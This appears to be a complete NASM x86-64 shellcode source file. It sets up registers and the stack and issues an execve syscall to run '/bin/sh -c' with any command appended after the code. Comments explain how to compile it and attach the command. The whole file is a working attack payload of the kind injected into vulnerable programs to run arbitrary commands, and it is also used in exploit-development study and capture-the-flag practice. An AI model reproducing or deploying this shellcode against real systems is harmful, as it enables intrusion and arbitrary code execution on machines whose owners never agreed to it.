BITS 64
  ;; This shell code executes any sh command
  ;; Append the null terminated command to the end of the shellcode
  ;; Will execute: '/bin/sh -c "your command"
  ;; Compile with nasm -o a.out -f bin <filename>
  ;; There are null's in this shellcode
  ;; 
  xor     rax,rax
  xor     rdi,rdi
  xor     rsi,rsi
  xor     rdx,rdx
  xor     r8,r8
  jmp     arg2

getarg2:                    ; Begin setting up stack with argc for execve
  pop     rdx               ; Address of arg two, user supplied appended to end
  push    rax               ; The null address that terminate the argc vector
  push    rdx               ; Put the address of the user supplied cmd in argc
  jmp     arg1

getarg1:
  pop     rdx
  push    rdx               ; Put the address of "-c" in the argc vector
  jmp     sh

getsh:
  pop     rdx               ; The address of the /bin/sh command gets used twice
  push    rdx               
  pop     rdi               ; The program name goes in rdi, the first argument to execve
  push    rdx               ; The first element in the argc vector should be the program name
  push    rsp               ; The address of the argc array is now in rsp
  pop     rsi               ; The second argument to execve, the address of the argc vector goes in rsi
  push    rax               ; The third argument to execve, the address of the env vector goes in rdx
  pop     rdx               ; The env vector can be null
  push    0x3b              ; Load the syscall number for execve in rax
  pop     rax
  syscall                   ; If execve succeeds no further code is executed

arg1:
  call    getarg1
  db      "-c"
  db      0x0

sh:
  call    getsh
  db      "/bin/sh"
  db      0x0

arg2:
  call    getarg2           ; Remember to append the command you want to run
